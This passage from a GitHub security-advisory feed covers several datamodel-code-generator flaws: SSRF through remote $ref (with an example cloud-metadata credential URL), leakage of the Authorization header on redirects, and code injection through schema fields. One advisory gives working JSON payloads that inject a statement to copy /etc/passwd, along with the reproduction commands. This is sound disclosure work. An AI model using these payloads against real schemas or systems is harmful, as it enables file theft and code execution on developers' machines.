            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m8r-38jm-f355</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:44:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to SSRF via JSON-Schema `$ref` to HTTP URL (silent by default)]]></title>
        <id>https://github.com/advisories/GHSA-954p-556p-r752</id>
        <link href="https://github.com/advisories/GHSA-954p-556p-r752"/>
        <updated>2026-07-28T21:42:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>JSON-Schema <code>$ref</code> values pointing at HTTP or HTTPS URLs are silently dereferenced by <code>datamodel-code-generator</code> with no IP/host validation, no scheme allow-list, and redirects followed unconditionally. The <code>--allow-remote-refs</code> gate added in 0.56.0 defaults to <code>None</code>, which only emits a deprecation warning and then fetches the URL anyway; only explicit <code>--allow-remote-refs=false</code> blocks the request. The fetched body is parsed as a sub-schema and reflected verbatim into the generated <code>.py</code> source. As a result, any JSON-Schema document the developer feeds to <code>datamodel-codegen</code> — including documents authored by an attacker — can pivot to arbitrary internal addresses and leak the response into the generated code, with no developer cooperation beyond running the tool.</p>
<h3 id="details">Details</h3>
<p>Sink: <code>src/datamodel_code_generator/parser/jsonschema.py</code>, <code>_get_ref_body</code> (lines 4776–4793, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
<pre><code class="language-python">def _get_ref_body(self, resolved_ref: str) -&gt; dict[str, YamlValue]:
    if is_url(resolved_ref):
        if not resolved_ref.startswith("file://") and self.http_local_ref_path is None:
            if self.allow_remote_refs is False:
                raise Error(f"Fetching remote $ref is disabled: {resolved_ref}...")
            if self.allow_remote_refs is None:
                warn_deprecated(                            # (A) warn only
                    "behavior.remote-ref-default",
                    details=f"Reference: {resolved_ref}",
                    stacklevel=2,
                )
        return self._get_ref_body_from_url(resolved_ref)    # (B) fetch fires
    return self._get_ref_body_from_remote(resolved_ref)
</code></pre>
<ul>
<li>(A) emits a deprecation warning when <code>allow_remote_refs</code> is its default (<code>None</code>); execution falls through to (B).</li>
<li>(B) routes the URL through <code>_get_text_from_url</code> → <code>get_body</code>, the same fetcher described in other report — no IP validation, redirects followed.</li>
</ul>
<p>The fetched body is then parsed as a sub-schema and merged into the model graph, so <code>description</code>, <code>title</code>, <code>properties</code>, etc. from the remote document end up in the generated <code>.py</code> source.</p>
<p>Only affects users who installed the <code>[http]</code> extra (<code>pip install 'datamodel-code-generator[http]'</code>).</p>
<h3 id="poc">PoC</h3>
<p>A self-contained one-file PoC is available here: <a href="https://gist.github.com/thegr1ffyn/562a6972d7dc3f2869458ae93fc608c0">https://gist.github.com/thegr1ffyn/562a6972d7dc3f2869458ae93fc608c0</a></p>
<h3 id="impact">Impact</h3>
<p><strong>Who is impacted.</strong> Anyone running <code>datamodel-codegen</code> on a JSON-Schema or OpenAPI document of uncertain provenance, with the <code>[http]</code> extra installed. Real-world scenarios:</p>
<ol>
<li><strong>Trojaned OpenAPI document.</strong> A public REST API publishes <code>openapi.yaml</code>. One <code>$ref</code> points at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>; running <code>datamodel-codegen</code> against the spec from an EC2 instance leaks the IAM credentials into the generated client.</li>
<li><strong>Customer-supplied JSON Schema.</strong> A B2B SaaS auto-generates client code from customer-uploaded schemas. The customer adds an HTTP <code>$ref</code> to <code>http://internal-admin:8080/users.json</code>; the response (e.g. JSON user list) ends up in the generated Python the SaaS hands back to the customer.</li>
<li><strong>CI on a private network.</strong> A PR adds <code>schemas/inbound.json</code> with an HTTP <code>$ref</code> pointed at a service reachable only from the CI cluster's VPC; the CI runner fetches it and the generated <code>.py</code> leaks the response in PR artifacts.</li>
</ol>
<p>Higher real-world risk than the sibling CLI-flag SSRF (other SSRF in this report bundle) because the <em>schema author</em> chooses the destination — the developer doesn't have to type any URL.</p>
<p><strong>Suggested fix.</strong></p>
<ol>
<li>Flip the default in <code>parser/base.py</code>: <code>allow_remote_refs: bool = False</code>, and remove the silent-fetch-with-warning fallback at <code>parser/jsonschema.py:4786-4791</code>.</li>
<li>When fetching is allowed, apply the same IP/host validation proposed for other submitted SSRF report to both the initial <code>$ref</code> URL and every redirect target.</li>
<li>Document HTTP <code>$ref</code> in a third-party schema as equivalent to running <code>curl</code> on the developer's host.</li>
</ol>
<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>This <code>$ref</code> report is fixed by the same shared HTTP fetcher hardening that resolved GHSA-rfr2-mq9m-x2qx. The code landed through the GHSA-rfr2 private security PR koxudaxi/datamodel-code-generator-ghsa-rfr2-mq9m-x2qx#1 and was merged into the public repository as 5fdba4a09f2d7a9996a504975b7ef7d63e3715bb. Follow-up generated-file and coverage fixes were merged in koxudaxi/datamodel-code-generator#3279 and docs were synced in #3280. The patched release is 0.61.0.</p>
<p>No separate net code diff remains in the GHSA-954 private PR because the shared HTTP fetcher patch is already present on <code>main</code>. This advisory remains separate because the affected entry point is remote JSON Schema/OpenAPI <code>$ref</code> resolution rather than direct CLI <code>--url</code> input.</p>
<p>The fix does not flip the <code>--allow-remote-refs</code> compatibility default in this patch. Instead, it mitigates the SSRF issue by blocking localhost, loopback, private, link-local, reserved, and other non-public network targets by default, validating every redirect target before it is fetched, and requiring <code>--allow-private-network</code> / <code>allow_private_network=True</code> for trusted internal schema endpoints. Remote <code>$ref</code> fetching remains controlled by <code>--allow-remote-refs</code>; non-public/internal targets additionally require <code>--allow-private-network</code>.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-954p-556p-r752">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-954p-556p-r752</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/5fdba4a09f2d7a9996a504975b7ef7d63e3715bb">https://github.com/koxudaxi/datamodel-code-generator/commit/5fdba4a09f2d7a9996a504975b7ef7d63e3715bb</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.61.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.61.0</a></li>
<li><a href="https://github.com/advisories/GHSA-954p-556p-r752">https://github.com/advisories/GHSA-954p-556p-r752</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-954p-556p-r752</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:42:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to code injection via `x-python-import` / `customTypePath` in generated import statements]]></title>
        <id>https://github.com/advisories/GHSA-5578-w22f-pfx9</id>
        <link href="https://github.com/advisories/GHSA-5578-w22f-pfx9"/>
        <updated>2026-07-28T21:40:21.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>A malicious input schema (OpenAPI / JSON Schema) can execute arbitrary Python code on the machine that <strong>imports</strong> the generated model. The <code>x-python-import</code> and <code>customTypePath</code> schema extensions flow, unsanitized, into the <code>import</code> statements datamodel-code-generator emits. A newline embedded in the extension value breaks out of the <code>from … import …</code> line and injects an attacker-controlled statement at module scope, which runs at import time. This is an unauthenticated, schema-content–driven remote code execution against any consumer of the generated code (e.g. arbitrary file read,the PoC exfiltrates <code>/etc/passwd</code>). It survives the v0.61.0 security release that fixed the related <code>x-python-type</code>, <code>default_factory</code>, GraphQL-union-description, and <code>validators</code> sinks  those fixes did not cover this sibling path.</p>
<h4 id="details">Details</h4>
<p>The sink is <code>Import.from_full_path</code> and <code>Imports.create_line</code>:</p>
<ul>
<li><code>src/datamodel_code_generator/imports.py:35</code> — <code>from_full_path()</code> only does <code>class_path.split(".")</code> and preserves every other character, <strong>including newlines</strong>:<pre><code class="language-python">@classmethod
@lru_cache
def from_full_path(cls, class_path: str) -&gt; Import:
    split_class_path: list[str] = class_path.split(".")
    return cls(import_=split_class_path[-1], from_=".".join(split_class_path[:-1]) or None)
</code></pre>
</li>
<li><code>src/datamodel_code_generator/imports.py:64</code> — <code>create_line()</code> renders the result verbatim:<pre><code class="language-python">def create_line(self, from_: str | None, imports: set[str]) -&gt; str:
    if from_:
        return f"from {from_} import {', '.join(self._set_alias(from_, imports))}"
    return "\n".join(f"import {i}" for i in self._set_alias(from_, imports))
</code></pre>
</li>
</ul>
<p>There is no check that the path segments are Python identifiers, contrast <code>validators._validate_dotted_python_identifier_path</code>, which the same v0.61.0 release added for the <code>validators</code> config, and <code>types.is_python_type_annotation</code>, added for <code>x-python-type</code>. The two extensions below were left unguarded.</p>
<p>Two schema-controlled, <strong>default-config</strong> entry points reach this sink:</p>
<ol>
<li><strong><code>x-python-import</code></strong> — <code>src/datamodel_code_generator/parser/jsonschema.py:1851-1858</code> (<code>get_ref_data_type</code>):<pre><code class="language-python">x_python_import = ref_schema.extras.get("x-python-import")
if isinstance(x_python_import, dict):
    module = x_python_import.get("module")
    type_name = x_python_import.get("name")
    if module and type_name:
        full_path = f"{module}.{type_name}"
        import_ = Import.from_full_path(full_path)
        self.imports.append(import_)
</code></pre>
</li>
<li><strong><code>customTypePath</code></strong> — declared at <code>src/datamodel_code_generator/parser/jsonschema.py:438</code>, consumed at <code>:4118</code> and <code>:4365</code> via <code>get_data_type_from_full_path(custom_type_path, is_custom_type=True)</code> → the same <code>Import.from_full_path</code> sink.</li>
</ol>
<p><strong>Mechanism.</strong> With <code>name = "getcwd\nprint(...)"</code>, <code>full_path = "os.getcwd\nprint(...)"</code>. <code>from_full_path</code> splits only on <code>.</code>, so (provided the injected statement contains no <code>.</code>) it yields <code>from_="os"</code> and <code>import_="getcwd\nprint(...)"</code>. <code>create_line</code> then emits:</p>
<pre><code class="language-python">from os import getcwd
print(...)        # ← attacker statement at module scope, executes on import
</code></pre>
<p>The dot-split is the only constraint on the payload; it is trivially satisfied with attribute-free builtins (e.g. <code>print(*open('/etc/passwd'), file=open('/tmp/loot','w'), sep='', end='')</code> reads and exfiltrates a file using no <code>.</code>).</p>
<p>None of the six v0.61.0 fix commits (<code>aec47bc4</code>, <code>b73abb5c</code>, <code>17fc235e</code>, <code>2c93c9b7</code>, <code>a43d0290</code>, <code>5fdba4a0</code>) touched <code>x-python-import</code>, <code>customTypePath</code>, or <code>imports.py</code>; <code>imports.py</code> was last modified ~5 months before the release. This is therefore an <strong>incomplete fix</strong>: the maintainer hardened sibling schema-controlled type/extension sinks but missed these two paths into the same import-generation code.</p>
<h4 id="poc">PoC</h4>
<p>Self contained POC available here: <a href="https://gist.github.com/thegr1ffyn/c3abb41bb89c164daa0d5f2c60b5328b">https://gist.github.com/thegr1ffyn/c3abb41bb89c164daa0d5f2c60b5328b</a></p>
<p>Default invocation, no special flags, on the patched release (commit <code>227ffe85ee2dcfc79336fbb14ad64c02a166b65a</code>, v0.61.0).</p>
<p><code>payload_a.json</code>:</p>
<pre><code class="language-json">{
  "type": "object",
  "title": "Root",
  "required": ["f"],
  "properties": { "f": { "$ref": "#/$defs/Evil" } },
  "$defs": {
    "Evil": {
      "type": "object",
      "x-python-import": {
        "module": "os",
        "name": "getcwd\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_xpi_loot','w'),sep='',end='')"
      }
    }
  }
}
</code></pre>
<p>Generate and import:</p>
<pre><code class="language-bash">datamodel-codegen --input payload_a.json --input-file-type jsonschema --output model.py
python -c "import model"
</code></pre>
<p>Generated <code>model.py</code> (verbatim, the breakout sits at module scope):</p>
<pre><code class="language-python">from __future__ import annotations

from os import getcwd

print(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')
from os import getcwd

print(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')
from pydantic import BaseModel
...
</code></pre>
<p>Importing <code>model</code> reads <code>/etc/passwd</code> and writes an exact copy to <code>/tmp/dmcg_xpi_loot</code>:</p>
<pre><code>$ head -1 /tmp/dmcg_xpi_loot
root:x:0:0:root:/root:/bin/bash
</code></pre>
<p>Confirmed under both the default output (pydantic v1) and <code>--output-model-type pydantic_v2.BaseModel</code>. The <code>customTypePath</code> variant reproduces identically:</p>
<pre><code class="language-json">{ "type":"object","title":"Root","required":["f"],
  "properties":{ "f":{ "type":"object",
    "customTypePath":"os.getcwd\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_ctp_loot','w'),sep='',end='')" }}}
</code></pre>
<p>A benign control (<code>x-python-import: {"module":"decimal","name":"Decimal"}</code>) produces clean <code>from decimal import Decimal</code> and no execution. A complete self-contained validation harness, <code>run.sh</code> plus <code>control.json</code>, <code>payload_a.json</code>, <code>payload_b.json</code>, is included alongside this advisory (CONTROL clean + three payloads firing + verdict + cleanup).</p>
<p><strong>Suggested fix.</strong> Validate every dotted segment of <code>module</code>, <code>name</code>, and <code>customTypePath</code> as a Python identifier before building the import (reuse <code>validators._validate_dotted_python_identifier_path</code>), and/or reject non-identifier paths centrally inside <code>Import.from_full_path</code>.</p>
<h4 id="impact">Impact</h4>
<p>Arbitrary code execution at model-import time, driven by attacker-controlled schema content under the default configuration. Anyone who runs datamodel-code-generator on an untrusted or third-party schema, multi-tenant code-generation services, CI pipelines that ingest external specs, or a developer generating models from a public/vendor OpenAPI/JSON-Schema document, and then imports (or whose tooling imports) the generated module, executes the attacker's code with the importing process's privileges. The PoC demonstrates arbitrary local file read (<code>/etc/passwd</code>); the same primitive yields full RCE.</p>
<h3 id="maintainer-status">Maintainer status</h3>
<p>Confirmed by maintainer review and regression tests. A private fix PR is open and should be merged before publishing this advisory: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-5578-w22f-pfx9/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-5578-w22f-pfx9/pull/1</a></p>
<p>Fix summary: validate <code>x-python-import</code> and <code>customTypePath</code> values as dotted Python identifier paths before using them in generated imports or type paths.</p>
<p>Release status: not fixed in <code>0.63.0</code>; <code>customTypePath</code> was introduced in <code>0.11.6</code>, so affected versions are <code>&gt;= 0.11.6, &lt;= 0.63.0</code>. This advisory should remain unpublished until the private PR is merged and a patched release is available.</p>
<p>Validation: <code>uv run --group test --extra http pytest tests/main/jsonschema/test_main_jsonschema.py tests/parser/test_jsonschema.py</code> passed locally; <code>uv run --group fix ruff check src/datamodel_code_generator/parser/jsonschema.py tests/main/jsonschema/test_main_jsonschema.py</code> passed.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/577d49569c2254c371a97e495020ae2238a73b84">https://github.com/koxudaxi/datamodel-code-generator/commit/577d49569c2254c371a97e495020ae2238a73b84</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.64.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.64.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5578-w22f-pfx9">https://github.com/advisories/GHSA-5578-w22f-pfx9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5578-w22f-pfx9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:40:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code injection via unescaped carriage return in GraphQL Union description]]></title>
        <id>https://github.com/advisories/GHSA-j884-q54q-mmx3</id>
        <link href="https://github.com/advisories/GHSA-j884-q54q-mmx3"/>
        <updated>2026-07-28T21:35:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>datamodel-code-generator</code> is vulnerable to code injection when generating Python models from an attacker-controlled GraphQL schema. A description on a Union type, written in the regular-string form (<code>"..."</code>) with a literal <code>\r</code> escape, is rendered into a Python <code>#</code> comment by a Jinja2 filter that handles only <code>\n</code>. Python's tokenizer treats a bare CR as a physical-line terminator, so the comment ends at the <code>\r</code> and the text after it is parsed as module-level Python. The injected code executes at <code>import</code> time of the generated <code>.py</code>, in the context of any consumer that imports the model. No special CLI flags are required.</p>
<p>This affects versions <code>&gt;=0.25.0, &lt;0.60.1</code> and is fixed in <code>0.60.1</code>.</p>
<h3 id="details">Details</h3>
<p>The vulnerable output was generated by the GraphQL Union templates:</p>
<ul>
<li><code>src/datamodel_code_generator/model/template/UnionTypeStatement.jinja2</code></li>
<li><code>src/datamodel_code_generator/model/template/UnionTypeAliasAnnotation.jinja2</code></li>
<li><code>src/datamodel_code_generator/model/template/UnionTypeAliasType.jinja2</code></li>
</ul>
<p>Before <code>0.60.1</code>, Union descriptions were rendered as Python comments using logic equivalent to <code># {{ description | replace('\n', '\n# ') }}</code>.</p>
<p>The Jinja2 <code>replace</code> filter handled <code>\n</code>, but bare <code>\r</code> was not normalized. Python's lexical analysis treats CR, LF, and CRLF as physical line terminators. As a result, a malicious GraphQL schema could cause the generated Python comment to end early and emit attacker-controlled text as module-level Python code.</p>
<p>The <code>description</code> value reaches Union generation from <code>graphql-core</code> through <code>description=union_object.description</code>. GraphQL regular string values can contain <code>\r</code> escapes, and <code>graphql-core</code> preserves that value. Block strings are not affected in the same way because their line endings are normalized before reaching code generation.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can provide or influence a GraphQL schema processed by <code>datamodel-code-generator</code> could cause arbitrary Python code to be generated into the output file. That code would execute with the privileges of the process importing the generated model.</p>
<p>This can affect developers, CI pipelines, or applications that run <code>datamodel-codegen --input-file-type graphql</code> on untrusted or third-party GraphQL schemas and then import the generated Python module.</p>
<p>No custom templates, special CLI flags, or remote reference options are required.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.1</code> or later.</p>
<p>The fix normalizes carriage returns in GraphQL Union descriptions before rendering them as Python comments, so injected text remains inside the comment block.</p>
<h3 id="resolution">Resolution</h3>
<p>The fix applies <code>comment_safe</code> to GraphQL Union descriptions before template rendering. It normalizes CRLF and bare CR to LF so the existing Union comment templates keep the whole description inside the generated Python comment block.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-j884-q54q-mmx3">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-j884-q54q-mmx3</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.1">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.1</a></li>
<li><a href="https://github.com/advisories/GHSA-j884-q54q-mmx3">https://github.com/advisories/GHSA-j884-q54q-mmx3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j884-q54q-mmx3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:35:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code execution on import via `x-python-type` JSON-Schema extension in datamodel-code-generator]]></title>
        <id>https://github.com/advisories/GHSA-m34r-v34r-rf9q</id>
        <link href="https://github.com/advisories/GHSA-m34r-v34r-rf9q"/>
        <updated>2026-07-28T21:34:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>datamodel-code-generator</code> honours a custom <code>x-python-type</code> JSON-Schema extension that lets a schema author override the generated Python type for a field. The value is forwarded verbatim into the generated Python source as the field annotation, with a single sanitisation pass that is trivial to bypass. An attacker who controls a JSON Schema fed to <code>datamodel-codegen</code> can therefore embed an arbitrary Python statement in the generated module, which executes at class-definition time the moment the developer imports the file. No <code>--extra-template-data</code> and no special flags are required; the vulnerable code is reachable with default settings.</p>
<h3 id="details">Details</h3>
<p>Sink: <code>src/datamodel_code_generator/parser/jsonschema.py</code>, <code>_get_python_type_override</code> (lines 2055–2096, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
<pre><code class="language-python">def _get_python_type_override(self, obj: JsonSchemaObject) -&gt; DataType | None:
    x_python_type = obj.extras.get("x-python-type")
    if not x_python_type or not isinstance(x_python_type, str):
        return None
    schema_type = obj.type if isinstance(obj.type, str) else None
    if self._is_compatible_python_type(schema_type, x_python_type):
        return None
    base_type = self._get_python_type_base(x_python_type)
    import_ = self._resolve_type_import(base_type)
    type_str = x_python_type
    prefix = x_python_type.split("[", maxsplit=1)[0]
    if "." in prefix:                                  # only sanitiser
        type_str = base_type + x_python_type[len(prefix):]
        ...
    ...
    result = self.data_type(type=type_str, import_=import_)
    ...
    return result
</code></pre>
<p><code>DataType.type</code> flows unescaped into <code>{{ field.type_hint }}</code> in every model template
(<code>model/template/pydantic_v2/BaseModel.jinja2</code>,
<code>model/template/dataclass.jinja2</code>,
<code>model/template/TypedDictClass.jinja2</code>,
<code>model/template/msgspec.jinja2</code>, …).</p>
<p>The only sanitiser — the dot-rewrite at the marked line — fires only when <code>.</code> is in the substring <strong>before the first <code>[</code></strong> in the value. Placing <code>[</code> early (e.g. <code>X[1]; &lt;payload&gt;</code>) keeps <code>prefix == "X"</code> so the rewrite is skipped and the whole value lands in the generated annotation.</p>
<p><code>from __future__ import annotations</code> (emitted by default) makes the <code>X[1]</code> portion a lazy string, so <code>X</code> does not need to resolve at runtime. Everything after <code>;</code> is parsed as a real statement in the class body and is executed when the class is constructed during <code>import</code>.</p>
<p>Output-model types confirmed vulnerable in testing: <code>pydantic_v2.BaseModel</code>, <code>dataclasses.dataclass</code>, <code>typing.TypedDict</code>. <code>msgspec.Struct</code> emits structurally identical code.</p>
<h3 id="poc">PoC</h3>
<p>A self-contained PoC is available at: <a href="https://gist.github.com/thegr1ffyn/1a7ff2561a581074c49785230b2c5700">https://gist.github.com/thegr1ffyn/1a7ff2561a581074c49785230b2c5700</a></p>
<h3 id="impact">Impact</h3>
<p>Arbitrary code execution in the developer's interpreter / CI runner as soon as the generated module is imported. Reachable from any workflow that ingests an untrusted JSON Schema:</p>
<ul>
<li>OpenAPI / JSON-Schema documents fetched from third-party services or public registries.</li>
<li>Customer-supplied schemas in B2B platforms that auto-generate client SDKs from user input.</li>
<li>Schema files added by a malicious commit in a polyglot repository that triggers CI code generation.</li>
</ul>
<p>The compromise is silent: the schema is valid JSON, the generator emits syntactically clean Python (the trojan statement is a single indented line in the class body), and only the <em>use</em> of the generated file triggers the payload.</p>
<p>Anyone running <code>datamodel-codegen</code> against an attacker-supplied schema is impacted. CI runners and developer workstations are the primary blast radius.</p>
<h3 id="resolution">Resolution</h3>
<p>The fix validates <code>x-python-type</code> before constructing the generated type annotation. The value is parsed with <code>ast.parse(..., mode="eval")</code> and accepted only when the AST is shaped like a Python type annotation, including names, attributes, subscripts, tuple/list annotation arguments, <code>|</code> unions, and safe literal values where annotation syntax allows them. Statements, calls, and other executable expressions are rejected before code generation. The validator is cached to avoid repeated AST parsing for repeated values.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.51.0, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-m34r-v34r-rf9q">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-m34r-v34r-rf9q</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/2c93c9b712f43391dcfa975a1e4aa0b7c93ccbba">https://github.com/koxudaxi/datamodel-code-generator/commit/2c93c9b712f43391dcfa975a1e4aa0b7c93ccbba</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
<li><a href="https://github.com/advisories/GHSA-m34r-v34r-rf9q">https://github.com/advisories/GHSA-m34r-v34r-rf9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m34r-v34r-rf9q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:33:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator: Authorization / request headers leaked to cross-origin redirect target when fetching remote schemas]]></title>
        <id>https://github.com/advisories/GHSA-r5vv-ff45-prp2</id>
        <link href="https://github.com/advisories/GHSA-r5vv-ff45-prp2"/>
        <updated>2026-07-28T21:32:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When <code>datamodel-code-generator</code> fetches a remote schema and follows an HTTP redirect, it re-sends the original request headers, including any <code>Authorization</code> header, to the redirect target even when the redirect changes origin (host/port/scheme). Credentials that an operator scoped to a trusted schema host are therefore forwarded to an attacker-controlled or otherwise different host, leaking them.</p>
<h3 id="details">Details</h3>
<p>In <code>src/datamodel_code_generator/http.py</code>, <code>get_body()</code> follows redirects manually and re-issues each hop with the same <code>headers</code> argument, with no check that the origin is unchanged:</p>
<pre><code class="language-python">for redirect_count in range(MAX_HTTP_REDIRECTS + 1):
    _validate_url_for_fetch(current_url, allow_private_network=allow_private_network)
    response = httpx.get(current_url, headers=headers, follow_redirects=False, ...)  # same headers every hop
    if (redirect_url := _get_redirect_url(httpx, current_url, response)) is None:
        break
    current_url = redirect_url
</code></pre>
<p>Browsers and HTTP clients such as <code>requests</code>/<code>httpx</code> strip <code>Authorization</code> when a redirect crosses origin; here it is preserved unconditionally. Headers are operator-supplied via <code>--http-headers</code> (and credentials can also arrive through <code>--url</code> userinfo), so a redirect from the trusted host to any other host discloses them.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained reproducer: <a href="https://gist.github.com/thegr1ffyn/ade3035d7f2be95e16f11698259cdbc2">https://gist.github.com/thegr1ffyn/ade3035d7f2be95e16f11698259cdbc2</a><br>Host A (the trusted schema host) 302-redirects to host B (a different origin) which records received headers; the request carries an auth token scoped to A. </p>
<p>(The PoC uses loopback servers; <code>allow_private_network=True</code> is only to avoid the separate SSRF guard blocking loopback and has no bearing on the leak.)</p>
<h3 id="impact">Impact</h3>
<p>Exposure of sensitive information to an unauthorized actor (CWE-200). Affects operators who pass authentication headers/credentials to fetch a remote schema (<code>--http-headers</code>, <code>--url</code> with userinfo) when the configured host issues a redirect to a different origin — e.g. a compromised or open-redirect-prone schema host, or a redirect chain influenced by an attacker-supplied <code>$ref</code>. The leaked credential can then be replayed against the trusted host. This is a credential-scoping weakness secondary to, and in the same component as, the project's other SSRF hardening.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>When a redirect changes the origin (scheme/host/port), drop <code>Authorization</code> and other sensitive headers before following it, matching the behavior of mainstream HTTP clients.</p>
<h3 id="maintainer-status">Maintainer status</h3>
<p>Confirmed by maintainer review and regression tests. The private fix PR was merged and released in <code>0.63.0</code>: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-r5vv-ff45-prp2/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-r5vv-ff45-prp2/pull/1</a></p>
<p>Fix summary: strip <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code> headers when a redirect crosses origin; preserve headers for same-origin redirects.</p>
<p>Release status: fixed in <code>0.63.0</code>; <code>0.62.0</code> and earlier are affected.</p>
<p>Validation: <code>uv run --group test --extra http pytest tests/test_http.py</code> passed locally for the redirect regression coverage; <code>uv run --group fix ruff check src/datamodel_code_generator/http.py tests/test_http.py</code> passed.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-r5vv-ff45-prp2">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-r5vv-ff45-prp2</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/a585c037c8307b7aae815de193b7fe1c4c44994b">https://github.com/koxudaxi/datamodel-code-generator/commit/a585c037c8307b7aae815de193b7fe1c4c44994b</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.63.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.63.0</a></li>
<li><a href="https://github.com/advisories/GHSA-r5vv-ff45-prp2">https://github.com/advisories/GHSA-r5vv-ff45-prp2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5vv-ff45-prp2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-28T21:32:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to SSRF via --url: no host/IP validation, follows redirects]]></title>
        <id>https://github.com/advisories/GHSA-rfr2-mq9m-x2qx</id>
        <link href="https://github.com/advisories/GHSA-rfr2-mq9m-x2qx"/>
        <updated>2026-07-28T21:30:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
